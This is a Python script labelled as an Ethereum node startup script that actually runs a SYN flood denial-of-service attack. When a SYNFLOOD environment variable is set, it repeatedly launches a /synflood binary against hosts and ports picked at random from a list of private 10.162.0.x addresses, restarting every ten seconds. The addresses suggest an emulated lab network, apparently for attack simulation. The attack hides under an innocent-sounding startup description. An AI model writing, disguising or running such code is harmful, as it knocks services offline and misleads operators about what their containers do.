#!/usr/bin/env python3
"""
Ethereum node startup script.
Runs after the container has finished all other setup.
"""

import socket
import datetime
import os
import random
import signal
import subprocess
import time

TARGETS = [
    # AS162 host traffic services
    ("10.162.0.71", 80),
    ("10.162.0.71", 23),
    ("10.162.0.71", 53),
    ("10.162.0.71", 8088),
    ("10.162.0.71", 8545),
    ("10.162.0.71", 30303),
    ("10.162.0.72", 80),
    ("10.162.0.72", 23),
    ("10.162.0.72", 53),
    ("10.162.0.72", 8545),
    ("10.162.0.72", 30303),
    ("10.162.0.73", 80),
    ("10.162.0.73", 23),
    ("10.162.0.73", 53),
    ("10.162.0.73", 8545),
    ("10.162.0.73", 30303),
    ("10.162.0.74", 80),
    ("10.162.0.74", 23),
    ("10.162.0.74", 53),
]
RESTART_INTERVAL_SECONDS = 10
SYNFLOOD_PATH = "/synflood"


def log(message: str) -> None:
    timestamp = datetime.datetime.now().isoformat()
    print(f"[{timestamp}] {message}")


def kill_process(proc: subprocess.Popen) -> None:
    if proc.poll() is not None:
        return
    log(f"Stopping synflood pid={proc.pid}")
    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        log(f"synflood pid={proc.pid} did not stop, killing")
        proc.kill()
        proc.wait()


def run_synflood(target_ip: str, target_port: int) -> subprocess.Popen:
    print("Starting synflood attack on {}:{}".format(target_ip, target_port))
            
    log(f"Starting synflood against {target_ip}:{target_port}")
    return subprocess.Popen(
        [SYNFLOOD_PATH, target_ip, str(target_port)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def synflood_enabled() -> bool:
    return os.environ.get("SYNFLOOD", "").strip().lower() in {"1", "true"}


def synflood() -> None:
    hostname = socket.gethostname()
    log(f"Ethereum node '{hostname}' startup beginning")

    if not os.path.exists(SYNFLOOD_PATH):
        log(f"Error: synflood binary not found at {SYNFLOOD_PATH}")
        return

    proc = run_synflood(*random.choice(TARGETS))

    def handle_signal(signum, frame):
        log(f"Received signal {signum}, shutting down")
        kill_process(proc)
        raise SystemExit(0)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        while True:
            time.sleep(RESTART_INTERVAL_SECONDS)
            kill_process(proc)
            proc = run_synflood(*random.choice(TARGETS))
    except KeyboardInterrupt:
        kill_process(proc)
        log("Shutdown complete")


def main() -> None:
    if not synflood_enabled():
        log("SYNFLOOD disabled via environment variable; not starting synflood")
        return
    print("Starting synflood")
    synflood()


if __name__ == "__main__":
    main()
